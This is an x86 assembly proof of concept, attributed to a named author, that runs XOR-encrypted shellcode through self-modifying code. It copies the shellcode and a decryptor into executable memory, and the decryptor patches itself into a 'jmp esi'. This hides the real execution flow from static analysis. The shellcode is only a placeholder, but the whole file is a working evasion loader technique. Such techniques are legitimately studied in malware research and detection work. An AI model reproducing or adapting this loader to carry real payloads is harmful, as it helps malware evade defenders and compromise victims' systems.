comment!
A simple PoC that implement a self-modifying code to call an encrypted shellcode.
Compare to a plain jump to the decrypted shellcode, this PoC does not explocitly contains
the "jmp shellcode" instruction, ideally hiding the real execution flow.

2022 (C) Antonio 's4tan' Parata
!

.686
.model flat, stdcall
.stack 4096

VirtualAlloc proto lpAddress:ptr void, dwSize:ptr void, flAllocationType:dword, flProtect:dword
VirtualFree proto lpAddress:ptr void, dwSize:ptr void, dwFreeType:dword
VirtualProtect proto lpAddress:ptr void, dwSize:ptr void, flNewProtect:dword, lpflOldProtect:ptr dword

.code

@shellcode:
; this is my super crazy shellcode. It is WORD xor "encrypted" with key: 0ffe6h
db 009h, 0f7h, 009h, 0f7h, 05ah, 0f7h
shellcode_size equ $ - @shellcode

MEM_COMMIT equ 1000h
PAGE_EXECUTE_READWRITE equ 40h

@decryption:
xor word ptr [eax], 06799h ; 0ffe6 (jmp esi) XOR 06681h (first two bytes instruction)
inc eax
inc eax
dec ecx
loop @decryption
decryption_size equ $ - @decryption

main proc
	local mem_addr:dword

	xor edx, edx
	mov eax, shellcode_size
	mov ebx, 2
	div ebx

	; save reminder
	push edx

	mov ecx, edx
	add edx, shellcode_size + decryption_size
	invoke VirtualAlloc, 0h, edx, MEM_COMMIT, PAGE_EXECUTE_READWRITE

	; copy encrypted shellcode
	mov edi, eax
	mov esi, offset @shellcode
	mov ecx, shellcode_size
	rep movsb
		
	; add remined to have a multiple of 2
	pop edx
	add edi, edx

	; save this address
	mov ebx, edi

	; copy decryptor	
	mov esi, offset @decryption	
	mov ecx, decryption_size
	rep movsb	

	; setup decryption registers
	mov esi, eax ; save the start of the decrypted shellcode
	mov ecx, shellcode_size + decryption_size	
	call ebx

	ret
main endp

end main